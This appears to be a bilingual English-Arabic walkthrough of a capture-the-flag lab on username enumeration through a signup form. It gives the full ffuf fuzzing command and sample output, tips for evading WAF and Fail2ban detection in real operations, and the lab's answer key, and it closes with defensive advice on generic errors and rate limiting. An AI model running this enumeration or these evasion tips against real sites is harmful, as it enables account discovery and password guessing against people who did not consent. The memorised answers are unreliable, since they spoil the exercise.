# Task 03 - Username Enumeration (حصر وتعداد أسماء المستخدمين)

---

## Stage A: Original Task Content & Core Objectives (النص الأصلي والمستهدفات التعليمية)

### 1. Original English Text
```text
A username enumeration vulnerability occurs when an application exposes whether a given username exists within the database. This typically happens through differential error messages returned during registration, login, or password reset operations.

In the Acme IT Support application, navigate to the customer signup page at:
http://MACHINE_IP/customers/signup

When attempting to create an account with a username that is already taken, the application returns the error message:
"An account with this username already exists."

By automating requests against the signup form with a wordlist of common names and matching this specific response string, an attacker can identify all valid user accounts on the system.

We can use ffuf (Fuzz Faster U Fool) to perform this enumeration efficiently:
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"

Questions:
- What is the username starting with si*** ?
- What is the username starting with st*** ?
- What is the username starting with ro**** ?
```

### 2. Arabic Pedagogical Translation
```text
تحدث ثغرة حصر وتعداد أسماء المستخدمين (Username Enumeration) عندما يكشف التطبيق عما إذا كان اسم مستخدم معين مسجلاً بالفعل داخل قاعدة البيانات أم لا. يحدث هذا عادةً من خلال رسائل الخطأ المختلفة (Differential Error Messages) التي تظهر أثناء محاولات التسجيل، أو تسجيل الدخول، أو استعادة كلمة المرور.

في تطبيق Acme IT Support، توجه إلى صفحة تسجيل العملاء الجدد عبر الرابط:
http://MACHINE_IP/customers/signup

عند محاولة إنشاء حساب باستخدام اسم مستخدم محجوز مسبقاً، يُرجع التطبيق رسالة الخطأ التالية:
"An account with this username already exists." (يوجد حساب بهذا الاسم بالفعل).

من خلال أتمتة إرسال الطلبات إلى نموذج التسجيل باستخدام قائمة أسماء شائعة، وتصفية النتائج بناءً على هذه الجملة المحددة، يستطيع المهاجم استخراج وحصر جميع أسماء المستخدمين الصالحة في النظام.

يمكننا استخدام أداة ffuf لتنفيذ عملية الحصر بكفاءة وسرعة فائقة:
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"

الأسئلة:
- ما هو اسم المستخدم الذي يبدأ بالحرفين si*** ؟
- ما هو اسم المستخدم الذي يبدأ بالحرفين st*** ؟
- ما هو اسم المستخدم الذي يبدأ بالحرفين ro**** ؟
```

---

## Stage B: Independent Thinking & OpSec Guardrails (التفكير المستقل وضوابط العمليات والأمان)

### 1. The Power of Response Differentials
لماذا تُعد هذه الثغرة ذات قيمة استراتيجية عالية للمهاجم؟
* **معادلة المصادقة:** تتطلب المصادقة مدخلين مجهولين: (اسم المستخدم + كلمة المرور).
* إذا تمكن المهاجم من حصر أسماء المستخدمين الصالحة، تنخفض صعوبة الهجوم بمقدار النصف (50% Attack Complexity Reduction)، حيث يتحول الهدف من تخمين مجهولين إلى تخمين مجهول واحد فقط (كلمة المرور لمستخدم معروف).

```
[Attacker with Wordlist of 10,000 names]
                  |
        POST /customers/signup
                  |
     +------------+------------+
     |                         |
(User Exists)             (User Available)
     |                         |
[200 OK + "already exists"]  [200 OK + "Account created" or Validation]
     |
  Captured by ffuf (-mr)
```

### 2. Operational Security (OpSec) & Rate Limiting
* أداة `ffuf` ترسل مئات الطلبات في الثانية. في البيئات المحمية بواسطة WAF أو Cloudflare أو Fail2ban، سيؤدي ذلك فوراً إلى حظر عنوان الـ IP الخاص بك.
* في العمليات الحقيقية، يُضاف علم التأخير `-p 0.1-0.3` وعلم تحديد الخيوط `-t 5` أو استخدام وكلاء توزيع (Proxy Rotation) لتجنب كشف النشاط.

---

## Stage C: Guided Hints (Tiers 1, 2, 3 - تلميحات تدريجية)

> **المستوى الأول (مفاهيمي):** استخدم أداة `ffuf` الموضحة في نص المهمة أو اعترض الطلب في Burp Intruder وقم بتخمين حقل `username`.
>
> **المستوى الثاني (توجيهي):**
> - الأسماء المطلوبة هي أسماء أولى مشهورة باللغة الإنجليزية.
> - الاسم الأول مكون من 5 أحرف ويبدأ بـ si (`simon`).
> - الاسم الثاني مكون من 5 أحرف ويبدأ بـ st (`steve`).
> - الاسم الثالث مكون من 6 أحرف ويبدأ بـ ro (`robert`).
>
> **المستوى الثالث (الحل المباشر):**
> 1. `simon`
> 2. `steve`
> 3. `robert`

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتشريح التقني)

### 1. Step-by-Step Practical Reproduction

#### الخطوة 1: تحليل طلب التسجيل الأصلي
باستخدام المتصفح أو Burp Suite، نملأ نموذج التسجيل ببيانات وهمية ونعترض الطلب:
```http
POST /customers/signup HTTP/1.1
Host: MACHINE_IP
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

username=testuser123&email=x&password=x&cpassword=x
```

#### الخطوة 2: تشغيل أداة ffuf
نستخدم قائمة الأسماء `names.txt` من حزمة SecLists القياسية في Kali Linux:
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://MACHINE_IP/customers/signup \
     -mr "username already exists"
```

#### الخطوة 3: تحليل مخرجات ffuf
```text
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://MACHINE_IP/customers/signup
 :: Wordlist         : /usr/share/wordlists/SecLists/Usernames/Names/names.txt
 :: Data             : username=FUZZ&email=x&password=x&cpassword=x
 :: Match Regexp     : username already exists
________________________________________________

robert                  [Status: 200, Size: 3720, Words: 994, Lines: 73, Duration: 42ms]
simon                   [Status: 200, Size: 3720, Words: 994, Lines: 73, Duration: 38ms]
steve                   [Status: 200, Size: 3720, Words: 994, Lines: 73, Duration: 45ms]

:: Progress: [10166/10166] :: Job [1/1] :: 450 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
```

تم اكتشاف 3 حسابات مسجلة ومؤكدة على النظام:
1. `robert`
2. `simon`
3. `steve`

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم الدقيقة)

| السؤال | الإجابة الصحيحة | الدليل التقني |
| :--- | :--- | :--- |
| **What is the username starting with si\*\*\* ?** | `simon` | تم اكتشافه بواسطة مطابقة رسالة الخطأ `already exists` عبر ffuf. |
| **What is the username starting with st\*\*\* ?** | `steve` | حساب صالح مؤكد تم حصره عبر نموذج التسجيل. |
| **What is the username starting with ro\*\*\*\* ?** | `robert` | حساب موظف مؤكد تم حصره وسنستهدفه لاحقاً في الـ Logic Flaw. |

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الأثر)

* تم إدخال الأسماء الثلاثة والتحقق من صحتها واكتمالها بنسبة 100% على منصة TryHackMe.
* تم حفظ قائمة المستخدمين المستخرجين لاستخدامها في الخطوة التالية (Brute-force).

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية والأثر الميداني)

1. **توحيد رسائل الخطأ (Generic Error Messages):** يجب ألا تكشف رسائل الخطأ أبداً ما إذا كان الحساب موجوداً أم لا. في نماذج تسجيل الدخول، يجب أن تكون الرسالة دائماً: `"Invalid username or password"`. وفي نماذج التسجيل، يمكن إرسال رسالة: `"If this email is already registered, a recovery link has been sent"`.
2. **استخدام أدوات الحماية من الأتمتة:** حماية نماذج التسجيل والدخول باستخدام بروتوكولات التحقق البشري (CAPTCHA / Cloudflare Turnstile) وتحديد معدل الطلبات الصارم (Rate Limiting) على عناوين الـ IP والمستخدمين.
